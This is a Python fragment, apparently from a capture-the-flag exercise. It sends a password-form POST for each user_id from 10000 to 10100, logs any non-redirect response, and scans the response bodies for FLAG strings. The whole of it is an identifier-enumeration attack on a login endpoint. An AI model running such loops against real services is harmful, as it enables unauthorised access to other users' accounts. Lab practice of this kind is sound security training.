count_302 = 0
count_other = {}

print("[FINAL VERIFICATION] Testing complete user_id range 10000-10100")
print("=" * 60)

for user_id in test_ids:
    try:
        data = {
            "username": USERNAME,
            "user_id": str(user_id),
            "password": PASSWORD
        }
        
        resp = requests.post(
            f"{BASE_URL}/password/{USERNAME}",
            data=data,
            allow_redirects=False,
            timeout=5
        )
        
        status = resp.status_code
        
        if status == 302:
            count_302 += 1
        else:
            if status not in count_other:
                count_other[status] = []
            count_other[status].append(user_id)
            
            print(f"\n[!] NON-302 at user_id={user_id}")
            print(f"    Status: {status}")
            print(f"    Response: {resp.text}")
            
            # Check for FLAG
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flags:
                print(f"    [!] FLAGS: {flags}")
                
    except Exception as e:
        print(f"[ERROR] {user_id}: {e}")

